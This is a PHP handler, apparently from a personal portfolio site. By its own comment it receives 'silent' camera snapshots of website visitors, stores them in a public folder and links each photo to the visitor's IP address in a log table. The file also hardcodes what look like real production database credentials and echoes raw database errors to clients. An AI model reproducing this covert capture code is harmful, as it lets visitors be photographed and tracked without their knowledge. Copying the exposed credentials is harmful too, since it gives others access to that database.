<?php
/**
 * Visitor Camera Snapshot API Handler
 * Receives silent camera snapshot from visitors and links it to visitor_logs.
 */
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

header('Content-Type: application/json; charset=utf-8');

// Include DB configuration
$db_config_file = __DIR__ . '/../../config/dbconfig.php';
if (file_exists($db_config_file)) {
    require_once $db_config_file;
}

if (!isset($pdo)) {
    $is_local = (in_array($_SERVER['REMOTE_ADDR'] ?? '', ['127.0.0.1', '::1']) || strpos($_SERVER['HTTP_HOST'] ?? '', 'localhost') !== false);
    if ($is_local) {
        $db_host = '127.0.0.1';
        $db_user = 'root';
        $db_pass = '';
        $db_name = 'portfolio_db';
    } else {
        $db_host = 'sql306.infinityfree.com';
        $db_user = 'if0_41712671';
        $db_pass = 'mx9cnfa7YhJ4W';
        $db_name = 'if0_41712671_portfolio';
    }
    try {
        $pdo = new PDO("mysql:host=$db_host;dbname=$db_name;charset=utf8mb4", $db_user, $db_pass, [
            PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
            PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC
        ]);
    } catch (PDOException $e) {
        echo json_encode(['status' => 'error', 'message' => $e->getMessage()]);
        exit;
    }
}

$input = json_decode(file_get_contents('php://input'), true);
$image_data = $input['image'] ?? '';

if (!empty($image_data)) {
    // Strip data URI prefix
    $image_data = str_replace('data:image/jpeg;base64,', '', $image_data);
    $image_data = str_replace('data:image/png;base64,', '', $image_data);
    $image_data = str_replace(' ', '+', $image_data);
    
    $decoded_data = base64_decode($image_data);
    if ($decoded_data) {
        $target_dir = __DIR__ . '/../assets/images/visitors/';
        if (!is_dir($target_dir)) {
            @mkdir($target_dir, 0755, true);
        }
        
        $filename = 'visitor_' . time() . '_' . rand(1000, 9999) . '.jpg';
        $filepath = $target_dir . $filename;
        
        if (file_put_contents($filepath, $decoded_data)) {
            $rel_path = 'assets/images/visitors/' . $filename;
            $ip = $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';
            if ($ip === '::1') $ip = '127.0.0.1';
            
            // Update the latest visitor log for this IP or insert new
            $stmt = $pdo->prepare("UPDATE visitor_logs SET captured_photo = :photo WHERE ip_address = :ip ORDER BY id DESC LIMIT 1");
            $stmt->execute([':photo' => $rel_path, ':ip' => $ip]);
            
            echo json_encode(['status' => 'success', 'photo' => $rel_path]);
            exit;
        }
    }
}

echo json_encode(['status' => 'error', 'message' => 'Invalid image payload']);
exit;
